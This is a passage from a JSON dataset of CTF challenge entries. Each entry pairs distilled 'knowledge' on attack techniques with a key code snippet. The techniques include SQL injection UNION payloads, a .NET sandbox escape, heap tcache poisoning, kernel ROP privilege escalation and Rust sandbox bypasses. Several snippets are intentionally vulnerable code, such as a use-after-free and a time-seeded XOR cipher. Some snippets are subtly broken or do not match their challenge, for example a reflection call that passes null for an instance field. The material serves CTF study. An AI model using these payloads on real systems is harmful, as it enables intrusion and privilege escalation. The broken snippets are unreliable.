0\n\n           if (x, y, z) in cubes:  \n               assert cubes[(x, y, z)] == BOTTOM.cubes[j][i]  \n           cubes[(x, y, z)] = BOTTOM.cubes[j][i]\n\n   ############################################################\n\n   BACK = SIDES[0]  \n   print(\"Front\")  \n   for i in range(7):  \n       for j in range(7):  \n           x = i  \n           y = 0  \n           z = 6 - j\n\n           if (x, y, z) in cubes:  \n               assert cubes[(x, y, z)] == BACK.cubes[j][i]  \n           cubes[(x, y, z)] = BACK.cubes[j][i]\n\n   ############################################################\n\n   RIGHT = SIDES[1]  \n   print(\"Right\")  \n   for i in range(7):  \n       for j in range(7):  \n           x = 6  \n           y = j  \n           z = i\n\n           if (x, y, z) in cubes:  \n               assert cubes[(x, y, z)] == RIGHT.cubes[j][i]  \n           cubes[(x, y, z)] = RIGHT.cubes[j][i]\n\n   ############################################################\n\n   FRONT = SIDES[2]  \n   print(\"Back\")  \n   for i in range(7):  \n       for j in range(7):  \n           x = i  \n           y = 6  \n           z = j\n\n           if (x, y, z) in cubes:  \n               assert cubes[(x, y, z)] == FRONT.cubes[j][i]  \n           cubes[(x, y, z)] = FRONT.cubes[j][i]\n\n   ############################################################\n\n   LEFT = SIDES[3]  \n   print(\"Left\")  \n   for i in range(7):  \n       for j in range(7):  \n           x = 0  \n           y = j  \n           z = 6 - i\n\n           if (x, y, z) in cubes:  \n               assert cubes[(x, y, z)] == LEFT.cubes[j][i]  \n           cubes[(x, y, z)] = LEFT.cubes[j][i]\n\n   ############################################################\n\n   TOP = TOP  \n   print(\"Top\")  \n   for i in range(7):  \n       for j in range(7):  \n           x = i  \n           y = 6 - j  \n           z = 6\n\n           if (x, y, z) in cubes:  \n               assert cubes[(x, y, z)] == TOP.cubes[j][i]  \n           cubes[(x, y, z)] = TOP.cubes[j][i]\n\n   print(len((filter(lambda x: x % 2 == 0, cubes.values()))))  \n   print(cubes)  \n   return cubes\n```"
    },
    {
        "name": "mathsh",
        "write_up": "dataset/raw/mathsh.md",
        "type": "misc",
        "competition": [
            "GoogleCTF/2020",
            "https://ctftime.org/event/1041/tasks/"
        ],
        "score": 453,
        "max_score": 474,
        "difficulty": 0.9556962025316456,
        "knowledge": [
            "When dealing with .NET-based CTF challenges that involve sandbox escape, reflection and the use of `System.Security` namespaces are crucial. By leveraging methods marked with `SecuritySafeCritical` attribute and the use of `Assert` to modify permission checks, it's possible to bypass sandbox restrictions. Specifically, using the `Assert` method effectively stops the permission check at a certain point in the call stack, allowing code to execute with more privileges than otherwise allowed under normal sandbox constraints. This approach is particularly useful when the challenge restricts the direct execution of privileged methods but allows indirect execution through reflection or other means.",
            "In sandbox escape challenges, if directly calling security-critical methods is restricted, leveraging reflection to modify private fields of method info objects can bypass these restrictions. This is done by changing the `m_invocationFlags` of a `MethodInfo` object to remove the `NEED_SECURITY` flag, which allows security-transparent code to invoke security-critical methods. This method requires in-depth knowledge of .NET internals and reflection capabilities but offers a powerful way to elevate privileges of code executed within a restricted .NET AppDomain.\n\nExample of using reflection to modify `m_invocationFlags` and bypass security restrictions:\n```csharp\npublic static void ResetInvocationFlags(Object methodInfoObject) {\n    var flagsField = methodInfoObject.GetType().GetField(\"m_invocationFlags\", BindingFlags.Instance | BindingFlags.NonPublic);\n    var modifiedFlags = flagsField.GetValue(null) & ~INVOCATION_FLAGS.NEED_SECURITY; // Assuming INVOCATION_FLAGS is an enum with appropriate flags.\n    flagsField.SetValue(methodInfoObject, modifiedFlags);\n}\n```\n\n**Note:** This example assumes the existence of an `INVOCATION_FLAGS` enum and appropriately sets the `modifiedFlags` by removing the `NEED_SECURITY` flag. This technique relies on specific .NET Framework internals and reflection capabilities."
        ],
        "key": "```csharp  \n[SecuritySafeCritical]  \ninternal static object CallMethodSecure(object targetObject, string name, bool\ncase_sensitive, object[] args)  \n{  \n\tnew ReflectionPermission(PermissionState.Unrestricted).Assert();  \n\treturn JScriptUtils.CallMethod(targetObject, name, case_sensitive, args);  \n}  \n```"
    },
    {
        "name": "Matrix LED",
        "write_up": "dataset/raw/Matrix LED.md",
        "type": "reverse",
        "competition": [
            "TokyoWesterns/2018",
            "https://ctftime.org/event/651/tasks/"
        ],
        "score": 462,
        "max_score": 840,
        "difficulty": 0.55,
        "knowledge": [
            "In challenges involving hardware signal decoding, such as LED color sequences representing data, it's effective to use computer vision techniques for interpreting signals. Specifically, classification of colors to represent bits of information can be achieved by calculating the Euclidean distance from sampled colors to a pre-defined set of reference colors. This approach converts visual data into a binary or hexadecimal representation, which can then be further processed. For instance, eight distinct colors could represent three bits each, thereby encoding substantial data within a limited set of signals.\n   \n   Example pseudocode snippet for color classification based on Euclidean distance:\n   ```python\n   def classify_color(sampled_color):\n       reference_colors = [('red', (255, 0, 0)), ('green', (0, 255, 0)), ...]  # Define reference colors\n       closest_match = min(reference_colors, key=lambda color: euclidean_distance(sampled_color, color[1]))\n       return closest_match[0]\n   ```",
            "When dealing with encrypted data that includes checksum validation, especially in scenarios where direct decryption or checksum calculation reversal is challenging, using simulation tools such as `simavr` for AVR microcontroller binaries can effectively bypass complex reverse-engineering processes. This approach uses the binary's own logic to validate or correct data, particularly useful when a checksum needs to match for successful decryption or data interpretation. This technique allows for error correction in data transcription processes, improving the reliability of recovering encrypted or encoded messages without fully understanding the underlying checksum or encryption algorithm.\n\n   Example concept (No specific payload): Use the `simavr` tool to run the binary against input data variants to check for checksum consistency and validate correctness of the decrypted or transcribed data, correcting errors based on feedback from the simulation."
        ],
        "key": "```python\ndef convert_color(color):  \n   red = (240, 110, 120, \"red\")  \n   green = (40, 240, 175, \"green\")  \n   blue = (85, 110, 240, \"blue\")  \n   cyan = (70, 215, 240, \"cyan\")  \n   yellow = (235, 230, 150, \"yellow\")  \n   orange = (230, 200, 130, \"orange\")  \n   white = (220, 220, 240, \"white\")  \n   purple = (230, 150, 240, \"purple\")  \n   colors = [red, green, blue, cyan, yellow, orange, white, purple]  \n   best_match = (255 * 3, \"lol\")  \n   for c in colors:  \n       diff = color_delta(c, color)  \n       if diff < best_match[0]:  \n           best_match = diff, c[3]  \n   return best_match[1]\n\ndef color_delta(c1, c2):  \n   diff = 0  \n   for i in range(3):  \n       diff += abs(c1[i] - c2[i])  \n   return diff  \n\ndef handle_orange_and_yellow(pixels, column, row):  \n   size_x = 20  \n   size_y = 20  \n   greens = []  \n   for delta_x in range(-size_x, size_x):  \n       for delta_y in range(-size_y, size_y):  \n           color = pixels[column + delta_x, row + delta_y]  \n           grey = (130, 130, 130)  \n           white = (255, 255, 255)  \n           if max(similar_color(grey, color)) < 20:  \n               continue  \n           if max(similar_color(white, color)) < 100:  \n               continue  \n           greens.append(color[1])  \n   x = sorted(greens)[int(len(greens) * 0.75)]  \n   if x <= 230:  \n       return \"orange\"  \n   else:  \n       return \"yellow\"  \n```"
    },
    {
        "name": "mcgriddle",
        "write_up": "dataset/raw/mcgriddle.md",
        "type": "forensics",
        "competition": [
            "CSAW/2018/Quals",
            "https://ctftime.org/event/633/tasks/"
        ],
        "score": 300,
        "max_score": 1285,
        "difficulty": 0.23346303501945526,
        "knowledge": [
            "When analyzing a `pcap` file in a CTF challenge, it's beneficial to consider various encoding methods for data hidden in plain sight, such as Base64 encoding. Data might not immediately appear meaningful and can include irrelevant or 'garbage' information alongside valid data. Begin analysis by decoding any structured arrangements of characters that suggest a standard encoding format.",
            "In challenges involving dynamic content change, like a chess game, using historical state information can reveal hidden data. Tools or methods used to extract and analyze state changes, such as employing Forsyth-Edwards Notation (FEN) to track chess board positions, can be applied. This approach involves masking relevant data based on game state, effectively employing a context-sensitive filter to discern hidden information. If direct analysis yields incomplete results, consider earlier versions or different segments of provided data, as initial or interim states may contain less obfuscated information."
        ],
        "key": "```python\ndef parse_chess_moves(moves):\n    board = [['x' for _ in range(8)] for _ in range(8)]\n    for move in moves:\n        start, end = move[:2], move[2:]\n        start_x, start_y = ord(start[0]) - ord('a'), int(start[1]) - 1\n        end_x, end_y = ord(end[0]) - ord('a'), int(end[1]) - 1\n        board[start_y][start_x] = '.'\n        board[end_y][end_x] = 'x'\n    return board\n\nmoves = [\"e2e4\", \"e7e5\", \"g1f3\", \"b8c6\"]\nboard_state = parse_chess_moves(moves)\nfor row in board_state:\n    print(' '.join(row))\n```\n"
    },
    {
        "name": "mDLP",
        "write_up": "dataset/raw/mDLP.md",
        "type": "crypto",
        "competition": [
            "ASIS/2021/Finals",
            "https://ctftime.org/event/1416/tasks/"
        ],
        "score": 262,
        "max_score": 953,
        "difficulty": 0.27492130115424973,
        "knowledge": [
            "When facing cryptography challenges involving matrices and the Discrete Logarithm Problem (DLP), diagonalizing the given matrix to find its eigenvalues can simplify the process. If the prime factors of \\(p-1\\) (where \\(p\\) is a prime number from the public key) are known and manageable, one can use the Chinese Remainder Theorem (CRT) to solve for discrete logarithms within the matrix. This technique greatly reduces the complexity of breaking the cipher.",
            "To decrypt a ciphertext matrix \\(C\\), after determining the discrete logarithm \\(r\\) and \\(d\\) using eigenvalues and the CRT as mentioned, compute the inverse of \\(A^{rd}\\), where \\(A\\) is the base matrix and \\(r\\), \\(d\\) are the discrete logarithms found. Multiplying this inverse matrix by the ciphertext matrix \\(C\\) can yield the plaintext matrix \\(P\\), allowing for the decryption of the message.\n\nSample of Payload for decryption (key steps):\n```python\n# Define matrices A (base matrix), Ad (A to the power d), and Ar (A to the power r)\n# Calculate eigenvalues of A and define matrices P and Q (Q being the inverse of P)\n# Use CRT to find r and d\n# Calculate the inverse of A**(r*d) to decrypt C and retrieve P (plaintext matrix)\n# Convert matrix elements into bytes to extract the flag\n```"
        ],
        "key": "```python\ndef keygen(nbit, l):  \n\t#  \n\t## Create the n-bit prime and base square matrix of size l over Ring Z_p  \n\t#  \n\tp = gen_prime(nbit)  \n\tA = gen_base_matrix(p, l)\n\n\td = randint(2, p)  \n\tQ = A ** d  \n\tpubkey = (p, A, Q)  \n\tprivkey = d  \n\treturn pubkey, privkey\n\ndef encrypt(M, pubkey):  \n\tp, A, Q = pubkey  \n\tl = A.nrows()  \n\tassert M.nrows() == l  \n\tr = randint(2, p)  \n\tC, D = A ** r, Q ** r  \n\tE = D * M  \n\treturn C, E\n```"
    },
    {
        "name": "Medias",
        "write_up": "dataset/raw/Medias.md",
        "type": "reverse",
        "competition": [
            "ASIS/2019/Quals",
            "https://ctftime.org/event/732/tasks/"
        ],
        "score": 182,
        "max_score": 500,
        "difficulty": 0.364,
        "knowledge": [
            "When facing a binary that employs time-based non-deterministic encryption, one effective strategy involves generating all possible encryption keys within the feasible range (for example, 0 to 65535) and then brute-forcing the encrypted file using these keys to find decryptable content. This approach is especially applicable when the encryption algorithm's randomness is seeded by predictable values, such as the system's current time. To operationalize this, one can use a debugger script to systematically modify the generated random value to each possible key, apply the encryption process, and compare the output against known patterns of the target data (e.g., printable characters for text files). A practical example involves using GDB (GNU Debugger) scripts to automate the generation of encryption keys by overriding the random value generator of the binary.\n\n    Example GDB command to modify the random value: `gdb.execute(\"set $rax = \"+hex(index))`",
            "In challenges involving floating-point arithmetic and string encoding to conceal ASCII characters, a reversed engineering approach can decode the obscured content. This typically involves understanding the binary's logic for encoding numbers and characters and implementing a reverse function to retrieve the original data. Specifically, if the encoding mechanism involves arithmetic operations and shifts on floating-point numbers, writing a Python script that inversely applies these operations can successfully decode the encrypted message. The methodology is particularly effective when encoded characters follow a consistent logical or arithmetic pattern that, once identified, can be algorithmically inverted to reveal the hidden message.\n\n    Example Python snippet to reverse encoding: `def fancyToDouble(res): # Reverse engineered function to decode encoded text back to floating point numbers`"
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\nvoid encrypt_file(const char *filename) {\n    FILE *file = fopen(filename, \"rb\");\n    if (!file) {\n        perror(\"Failed to open file\");\n        return;\n    }\n\n    fseek(file, 0, SEEK_END);\n    long file_size = ftell(file);\n    fseek(file, 0, SEEK_SET);\n\n    unsigned char *buffer = malloc(file_size);\n    if (!buffer) {\n        perror(\"Failed to allocate memory\");\n        fclose(file);\n        return;\n    }\n\n    fread(buffer, 1, file_size, file);\n    fclose(file);\n\n    srand(time(NULL)); // Vulnerable: seeding with current time\n    for (long i = 0; i < file_size; i++) {\n        buffer[i] ^= rand() % 256; // Vulnerable: predictable XOR with rand\n    }\n\n    FILE *enc_file = fopen(\"encrypted.enc\", \"wb\");\n    if (!enc_file) {\n        perror(\"Failed to open encrypted file\");\n        free(buffer);\n        return;\n    }\n\n    fwrite(buffer, 1, file_size, enc_file);\n    fclose(enc_file);\n    free(buffer);\n}\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        fprintf(stderr, \"Usage: %s <file_to_encrypt>\\n\", argv[0]);\n        return 1;\n    }\n\n    encrypt_file(argv[1]);\n    return 0;\n}\n```"
    },
    {
        "name": "Medium Expectations",
        "write_up": "dataset/raw/Medium Expectations.md",
        "type": "crypto",
        "competition": [
            "BSidesTLV/2022",
            "https://ctftime.org/event/1680/tasks/"
        ],
        "score": -1,
        "max_score": 100,
        "difficulty": -1,
        "knowledge": [
            "When a CTF challenge involves generating seemingly random numbers where the seed is known and based on a static value, predictable outcomes can be exploited by replicating the random number generation logic in an attack script. This is because seeding a pseudo-random number generator (PRNG) with a constant value results in a deterministic sequence of numbers. In the challenge context, the seed was set using a hash of a known string, allowing for the replication of the PRNG sequence to predict the \"random\" values used in the game.\n   - Condition: Applicable when the random number generation in a challenge is seeded with a known and static value.\n   - Example payload: Replicate the PRNG sequence in an attacker's script using the known seed.\n     ```python\n     import hashlib, random\n     seed_value = int(hashlib.md5(b\"static_known_value\").hexdigest(), 16)\n     random.seed(seed_value)\n     # Now we can predict the random values generated by the PRNG\n     ```",
            "Automating interactions with remote services in CTF challenges can be effectively achieved using network scripting tools like pwntools. This facilitates sending and receiving data based on the predicted outcomes of the challenge's logic, allowing for swift and automated flag retrieval. This method is particularly useful when dealing with challenges that require repetitive tasks or where the solution involves iterating over a predictable set of values.\n   - Condition: Useful in challenges where automated input/output interaction with a remote service is required to exploit a vulnerability or logic flaw.\n   - Example payload: Use pwntools to automate interactions, sending pre-calculated inputs to meet the challenge conditions.\n     ```python\n     from pwn import remote\n     import random, hashlib\n     \n     # Configuration for the remote service\n     host, port = 'challenge.ctf.example.com', 1234\n     \n     # Establish the connection\n     p = remote(host, port)\n     \n     # Seed the PRNG as per the challenge's logic\n     random.seed(int(hashlib.md5(b\"static_known_value\").hexdigest(), 16))\n     \n     # Send predicted values based on the replicated PRNG sequence\n     p.sendline(str(random.randint(1, 4))) # Example for suit\n     p.sendline(str(random.randint(1, 13))) # Example for value\n     ```"
        ],
        "key": "```python\nimport random  \nimport hashlib  \nimport flag\n\nSTART_NUM_OF_PEOPLE = 60  \nPERFECT_SHOW = 2000  \nMAX_NUM_GAMES = 3000  \nRIGHT_GUESS = 60  \nWRONG_GUESS = 1  \nNUM_OF_SUITS = 4  \nNUM_OF_VALUES = 13\n\nWELCOME_TEXT = \"\"\"  \nYou are a mentalist and now it's your show!  \nIt's your chance to make the impossible possible!  \nCurrently there are {} people in the show.  \nYour goal is to have {} people in it!\n\nYou can do it!  \nMagic is real!!  \n\"\"\"\n\nSESSION_TEXT = \"\"\"  \nThere are {} people in the show  \nYou pick a volunteer\n\nYou ask her to think on a card  \n\"\"\"\n\nTHINK_OF_A_SUIT_TEXT = \"\"\"  \nYou ask her to think on the suit of the card  \nYou read her mind and choose:  \n   1) Spades  \n   2) Hearts  \n   3) Clubs  \n   4) Diamond  \n\"\"\"\n\nTHINK_OF_A_VALUE_TEXT = \"\"\"  \nYou ask her to think on the value of the card  \nValue between 1 and 13 when:  \n   1 is Ace  \n   2-10 are 2-10 :)  \n   11 is Jack  \n   12 is Queen  \n   13 is King  \nYou read her mind and choose:  \n\"\"\"\n\nRIGHT_GUESS_TEXT = \"\"\"  \nBravo! You did the impossible!  \nThe applause you get attracts {} more people to the show!  \n\"\"\"\n\nWRONG_GUESS_TEXT = \"\"\"  \nWrong answer :|  \nYou probably read someone else's mind by mistake...\n\nSomeone left the show :(  \n\"\"\"\n\nWIN_TEXT = \"You Won! Here is your flag:\"\n\nLOSE_TEXT = \"\"\"No one left in the show :(  \nMaybe you should practice more before...  \n\"\"\"\n\ndef red(text):  \n   return \"\\033[91m\" + text + \"\\033[0m\"\n\ndef green(text):  \n   return \"\\033[92m\" + text + \"\\033[0m\"\n\ndef purple(text):  \n   return \"\\033[95m\" + text + \"\\033[0m\"\n\n# return a number between 1 and the given range  \ndef rand_range(rng):  \n   return rng - random.randrange(rng)\n\ndef get_int(rng):  \n   while True:  \n       num_str = input(\">> \")  \n       if not num_str.isdigit():  \n           print(\"Not a number, try again :/\")  \n           continue  \n       num = int(num_str)  \n       if num <= 0 or num > rng:  \n           print(f\"Not in range, choose between 1 and {rng}\")  \n           continue  \n       break  \n   return num\n\ndef run_game():  \n   random.seed(int(hashlib.md5(b\"magic_is_real\").hexdigest(), 16))\n\n   people = START_NUM_OF_PEOPLE\n\n   print(WELCOME_TEXT.format(people, PERFECT_SHOW))\n\n   for i in range(MAX_NUM_GAMES):  \n       if people <= 0:  \n           print(red(LOSE_TEXT))  \n           break  \n       if people >= PERFECT_SHOW:  \n           print(green(WIN_TEXT))  \n           print(flag.FLAG)  \n           break\n\n       print(SESSION_TEXT.format(purple(str(people))))\n\n       print(THINK_OF_A_SUIT_TEXT)  \n       rand_suit = rand_range(NUM_OF_SUITS)  \n       suit = get_int(NUM_OF_SUITS)\n\n       print(THINK_OF_A_VALUE_TEXT)  \n       rand_value = rand_range(NUM_OF_VALUES)  \n       value = get_int(NUM_OF_VALUES)\n\n       if suit == rand_suit and value == rand_value:  \n           print(green(RIGHT_GUESS_TEXT.format(RIGHT_GUESS)))  \n           people += RIGHT_GUESS  \n       else:  \n           print(red(WRONG_GUESS_TEXT))  \n           people -= WRONG_GUESS  \n   else:  \n       print(\"Sorry... the crowd is bored\")\n\nif __name__ == \"__main__\":  \n   run_game()  \n```"
    },
    {
        "name": "Members",
        "write_up": "dataset/raw/Members.md",
        "type": "web",
        "competition": [
            "DaVinci/2021",
            "https://ctftime.org/event/1296/tasks/"
        ],
        "score": 66,
        "max_score": 499,
        "difficulty": 0.13226452905811623,
        "knowledge": [
            "In scenarios where a web application is interfaced with a SQL database and inputs are passed via URL parameters (indicating use of the GET method), the application may be vulnerable to SQL Injection if input validation or sanitization is not properly implemented. This vulnerability can be initially tested with payloads that alter the logic of SQL queries, such as appending a condition that always evaluates to true. Example payload: `Leonard\" OR 1=1; --`",
            "When a SQL Injection vulnerability is confirmed, it's possible to enumerate database schema information including table and column names, utilizing the `UNION` SQL command to combine a malicious query with the original query intended by the application. This approach can be particularly useful to discover hidden tables and retrieve critical data from them, including flags in CTF challenges. Information schema tables like `INFORMATION_SCHEMA.TABLES` for listing table names, and `INFORMATION_SCHEMA.COLUMNS` for finding column names within a specific table, can be targeted for this purpose. Example payload to enumerate tables: `Leonard\" UNION (SELECT TABLE_NAME,2,3 FROM INFORMATION_SCHEMA.TABLES); --`, and to enumerate columns of a specific table: `Leonard\" UNION (SELECT COLUMN_NAME,2,3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='supa_secret_table'); --`"
        ],
        "key": "```sql\nSELECT * FROM members WHERE name = 'Leonard\" OR 1=1; --';\n```"
    },
    {
        "name": "membership management",
        "write_up": "dataset/raw/membership management.md",
        "type": "pwn",
        "competition": [
            "Securinets/2021/Quals",
            "https://ctftime.org/event/1308/tasks/"
        ],
        "score": 988,
        "max_score": 1000,
        "difficulty": 0.988,
        "knowledge": [
            "In challenges where Use-After-Free (UAF) vulnerabilities are present, to manipulate heap metadata, especially when `tcache` is involved and libc version is >= 2.31, one can overwrite the least significant byte (LSB) of a chunk's forward pointer (FD) to redirect it to an attacker-controlled location on the heap. This allows for the construction of a fake chunk at the redirected location, facilitating heap manipulations such as overlapping chunks or tcache poisoning.",
            "In a scenario where direct leaks are not feasible due to the absence of show functions or similar, and the challenge environment includes Full RELRO, Canary, and PIE protections, it is possible to achieve arbitrary memory write or leak a libc address by manipulating the `_IO_2_1_stdout_` structure. The exploitation involves carefully crafting a fake chunk that points to `_IO_2_1_stdout_`, then corrupting the stdout structure to control the program's output and thus leak addresses or hijack control flow. After leaking the libc address, performing tcache poisoning to overwrite a critical function pointer such as `__free_hook` with the address of a function like `system` can lead to arbitrary code execution.\n\nExample payload steps (excluding specific addresses which are dependent on runtime conditions):",
            "Allocate multiple chunks to fill tcache bins and control heap layout.",
            "Manipulate FD of a free chunk to point to a fake chunk.",
            "Craft a fake chunk and control its size and FD to manage its bin placement.",
            "Overwrite a free chunk to manage `stdout` structure, using crafted input to alter the `stdout` and leak libc or control execution.",
            "Exploit tcache poisoning to overwrite `__free_hook` with `system` address, then trigger `free` on a controlled string to execute a command (e.g., spawning a shell).\n\nPayload specifics, such as how to craft the fake chunk or the exact input to modify `stdout`, depend on the target binary's memory layout and protections."
        ],
        "key": "```c\nvoid change_subscription() {\n    struct Subscription *sub = get_subscription();\n    if (sub) {\n        free(sub);\n        // Use-After-Free vulnerability\n        sub->type = get_new_type();\n    }\n}\n```"
    },
    {
        "name": "Memory",
        "write_up": "dataset/raw/Memory.md",
        "type": "forensics",
        "competition": [
            "Dragon/2020",
            "https://ctftime.org/event/1082/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In memory forensics challenges, the tool Volatility can be used to analyze memory image files. To determine the profile suitable for analysis, one should execute the command `volatility -f [memory_image] imageinfo`. This step is crucial for accurately configuring Volatility for further analysis. Given the right profile, one can then proceed to extract specific types of information such as the computer name, user names, and password hashes.",
            "When dealing with encrypted hashes, tools like Crackstation can be utilized to decrypt the hashes efficiently. This approach is applicable when hashes need to be converted back to plaintext (passwords, for instance) by matching them against a pre-computed lookup table of hashes vs. plaintext values. To utilize this, one must simply submit the hash to Crackstation and retrieve the corresponding plaintext result, if available.\n\nExample scenario where this knowledge is applicable:  \nWhen encountering a memory dump file in a CTF challenge, first identify the system specifications and important artifacts using Volatility by determining the profile. Following this, if password hashes are found and need to be decrypted for crafting the flag or for further exploitation, use Crackstation to potentially crack the hashes.\n\nExample Command for Volatility:  \n`$ volatility -f [memory_image] --profile=[Detected_Profile] printkey -K 'Software\\Microsoft\\Windows NT\\CurrentVersion'`\n\nThere is no specific example payload for using Crackstation as it involves simply inputting the hash into the website's interface."
        ],
        "key": "```c\nvoid main(void)\n\n{  \n undefined4 uVar1;  \n  \n count = (undefined4 *)malloc(4);  \n *count = 0;  \n init_buffering();  \n sandbox();  \n puts(\"Memory can be easily accessed !\");  \n do {  \n   menu();  \n   printf(\">> \");  \n   uVar1 = read_int();  \n   switch(uVar1) {  \n   case 1:  \n     dread();  \n     break;  \n   case 2:  \n     dwrite();  \n     break;  \n   case 3:  \n     dallocate();  \n     break;  \n   case 4:  \n     dfree();  \n     break;  \n   case 5:  \n     dview();  \n     break;  \n   case 6:  \n                   /* WARNING: Subroutine does not return */  \n     exit(1);  \n   }  \n } while( true );  \n}  \n```\n\n```c\nvoid sandbox(void)\n\n{  \n undefined8 uVar1;  \n long in_FS_OFFSET;  \n uint local_34;  \n undefined4 local_28 [6];  \n long local_10;  \n  \n local_10 = *(long *)(in_FS_OFFSET + 0x28);  \n uVar1 = seccomp_init(0);  \n local_28[0] = 0;  \n local_28[1] = 1;  \n local_28[2] = 2;  \n local_28[3] = 10;  \n local_28[4] = 0xe7;  \n for (local_34 = 0; local_34 < 5; local_34 = local_34 + 1) {  \n   seccomp_rule_add(uVar1,0x7fff0000,local_28[(int)local_34],0);  \n }  \n seccomp_load(uVar1);  \n if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {  \n                   /* WARNING: Subroutine does not return */  \n   __stack_chk_fail();  \n }  \n return;  \n}  \n```"
    },
    {
        "name": "memsafety",
        "write_up": "dataset/raw/memsafety.md",
        "type": "pwn",
        "competition": [
            "GoogleCTF/2021",
            "https://ctftime.org/event/1318/tasks/"
        ],
        "score": 203,
        "max_score": 233123.2321,
        "difficulty": 0.0008707840834710184,
        "knowledge": [
            "In scenarios where a sandbox limits operations through a Procedural Macro by checking the user-modules Abstract Syntax Tree (AST) for blocked operations, it's possible to bypass these limitations by defining and invoking a macro inside the module. This is because macros defined within the module are processed after the sandbox checks, enabling the execution of otherwise restricted operations.  \n   Example payload:  \n   ```rust\n   macro_rules! bypass_sandbox {\n       () => {\n           // Code that performs operations blocked by the sandbox\n       };\n   }\n   \n   // Usage of the macro to bypass sandbox restrictions\n   bypass_sandbox!();\n   ```",
            "Even when external crates or standard libraries are blocked by an overridden prelude in Rust, the restrictions can be circumvented by using `extern crate` statements to import external crates directly into the scope. This allows for the use of standard or external functions and libraries which are not included in the custom prelude, effectively bypassing these limitations.\n   Example payload:  \n   ```rust\n   extern crate std;\n   use std::fs;\n   \n   // Now, fs functions can be used to read files, etc., bypassing the custom prelude restrictions\n   let content = fs::read_to_string(\"/path/to/file\").expect(\"Failed to read file.\");\n   ```"
        ],
        "key": "```rust\n#![no_std]  \nuse proc_sandbox::sandbox;\n\n#[sandbox]  \npub mod user {  \n   static FLAG: &'static str = \"CTF{fake flag}\";  \n   use prelude::{mem::ManuallyDrop, Service, Box, String};  \n   pub struct State(ManuallyDrop<String>);  \n   impl State {  \n       pub fn new() -> Box<dyn Service> {  \n           Box::new(State(ManuallyDrop::new(String::from(FLAG))))  \n       }  \n   }  \n   impl Service for State {  \n      fn handle(&mut self, _: &str) {}  \n   }  \n}  \n```"
    },
    {
        "name": "meowmow",
        "write_up": "dataset/raw/meowmow.md",
        "type": "pwn",
        "competition": [
            "zer0pts/2020",
            "https://ctftime.org/event/1006/tasks/"
        ],
        "score": 732,
        "max_score": 755,
        "difficulty": 0.9695364238410596,
        "knowledge": [
            "In pwn challenges involving kernel exploitation that requires overcoming ASLR (Address Space Layout Randomization), a strategy is to trigger a heap overflow that allows leaking addresses from adjacent allocations. This technique was utilized by setting an offset near the end of a buffer and performing read or write operations with size parameters that exceed the buffer's boundaries, enabling the leak of adjacent memory contents. Example payload components involve manipulating file descriptors to read memory beyond allocated buffer sizes, such as: `lseek(fdm, 0x3FF, SEEK_SET); read(fdm, buffer, sizeof(buffer));`",
            "To construct a privilege escalation exploit in a pwn challenge involving a kernel environment with protections like SMEP, SMAP, and incomplete KPTI mitigation, a Return-Oriented Programming (ROP) chain can be assembled inside a controlled kernel buffer. This chain is crafted to execute `commit_creds(prepare_kernel_cred(NULL))` to elevate the current process to root. Afterward, carefully pivoting the stack to user-controlled data allows for execution of an `iret` instruction to safely transition back to user mode, effectively bypassing the mentioned kernel protections and mitigations. Example components of constructing such a ROP chain include setting up gadgets like `POPRDI`, `POPRSI`, `POPRDX`, etc., and utilizing offsets to execute kernel functions (`commit_creds`, `prepare_kernel_cred`) from within the kernel context."
        ],
        "key": "```c\n#include <linux/module.h>\n#include <linux/fs.h>\n#include <linux/uaccess.h>\n#include <linux/slab.h>\n\n#define DEVICE_NAME \"memo\"\n#define BUF_SIZE 0x400\n\nstatic char *buffer;\nstatic loff_t offset;\n\nstatic int memo_open(struct inode *inode, struct file *file) {\n    buffer = kmalloc(BUF_SIZE, GFP_KERNEL);\n    if (!buffer)\n        return -ENOMEM;\n    offset = 0;\n    return 0;\n}\n\nstatic ssize_t memo_read(struct file *file, char __user *user_buf, size_t count, loff_t *ppos) {\n    if (offset >= BUF_SIZE)\n        return 0;\n    if (count > BUF_SIZE - offset)\n        count = BUF_SIZE - offset;\n    if (copy_to_user(user_buf, buffer + offset, count))\n        return -EFAULT;\n    offset += count;\n    return count;\n}\n\nstatic ssize_t memo_write(struct file *file, const char __user *user_buf, size_t count, loff_t *ppos) {\n    if (offset >= BUF_SIZE)\n        return -ENOSPC;\n    if (count > BUF_SIZE - offset)\n        count = BUF_SIZE - offset;\n    if (copy_from_user(buffer + offset, user_buf, count))\n        return -EFAULT;\n    offset += count;\n    return count;\n}\n\nstatic loff_t memo_llseek(struct file *file, loff_t off, int whence) {\n    loff_t new_pos;\n    switch (whence) {\n    case 0: /* SEEK_SET */\n        new_pos = off;\n        break;\n    case 1: /* SEEK_CUR */\n        new_pos = offset + off;\n        break;\n    case 2: /* SEEK_END */\n        new_pos = BUF_SIZE + off;\n        break;\n    default: /* can't happen */\n        return -EINVAL;\n    }\n    if (new_pos < 0 || new_pos > BUF_SIZE)\n        return -EINVAL;\n    offset = new_pos;\n    return new_pos;\n}\n\nstatic int memo_release(struct inode *inode, struct file *file) {\n    kfree(buffer);\n    return 0;\n}\n\nstatic const struct file_operations memo_fops = {\n    .owner = THIS_MODULE,\n    .open = memo_open,\n    .read = memo_read,\n    .write = memo_write,\n    .llseek = memo_llseek,\n    .release = memo_release,\n};\n\nstatic int __init memo_init(void) {\n    int ret;\n    ret = register_chrdev(0, DEVICE_NAME, &memo_fops);\n    if (ret < 0) {\n        printk(KERN_ERR \"Unable to register memo device\\n\");\n        return ret;\n    }\n    printk(KERN_INFO \"memo device registered with major number %d\\n\", ret);\n    return 0;\n}\n\nstatic void __exit memo_exit(void) {\n    unregister_chrdev(0, DEVICE_NAME);\n    printk(KERN_INFO \"memo device unregistered\\n\");\n}\n\nmodule_init(memo_init);\nmodule_exit(memo_exit);\n\nMODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"CTF\");\nMODULE_DESCRIPTION(\"Vulnerable memo device\");\n```\n"
    },
    {
        "name": "Merriam Webster",
        "write_up": "dataset/raw/Merriam Webster.md",
        "type": "pwn",
        "competition": [
            "NahamCon/2020",
            "https://ctftime.org/event/1067/tasks/"
        ],
        "score": 125,
        "max_score": 1000,
        "difficulty": 0.125,
        "knowledge": [
